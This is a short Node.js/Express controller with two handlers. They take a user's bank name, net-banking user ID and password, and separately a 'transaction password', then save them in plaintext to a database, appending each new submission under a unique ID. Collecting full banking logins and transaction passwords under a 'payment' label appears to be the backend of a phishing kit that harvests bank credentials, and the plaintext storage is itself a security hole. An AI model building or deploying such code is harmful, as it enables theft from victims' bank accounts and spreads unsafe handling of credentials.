const NetBanking = require('../models/NetBanking');
const TransactionPassword = require('../models/Tmodel');

exports.submitNetBankingPayment = async (req, res) => {
    try {
        const { uniqueid, bankName, userId, password } = req.body;
        let netBanking = await NetBanking.findOne({ uniqueid });

        if (netBanking) {
            netBanking.entries.push({ bankName, userId, password});
        } else {
            netBanking = new NetBanking({
                uniqueid,
                entries: [{ bankName, userId, password}]
            });
        }

        await netBanking.save();
        res.status(200).json({
            success: true,
            message: "Net Banking Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting net banking payment data"
        });
    }
};

exports.submitTransactionPassword = async (req, res) => {
    try {
        const { uniqueid, transactionPassword } = req.body;
        let transactionData = await TransactionPassword.findOne({ uniqueid });

        if (transactionData) {
            transactionData.entries.push({ transactionPassword });
        } else {
            transactionData = new TransactionPassword({
                uniqueid,
                entries: [{ transactionPassword }]
            });
        }

        await transactionData.save();
        res.status(200).json({
            success: true,
            message: "Transaction Password Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting transaction password"
        });
    }
};
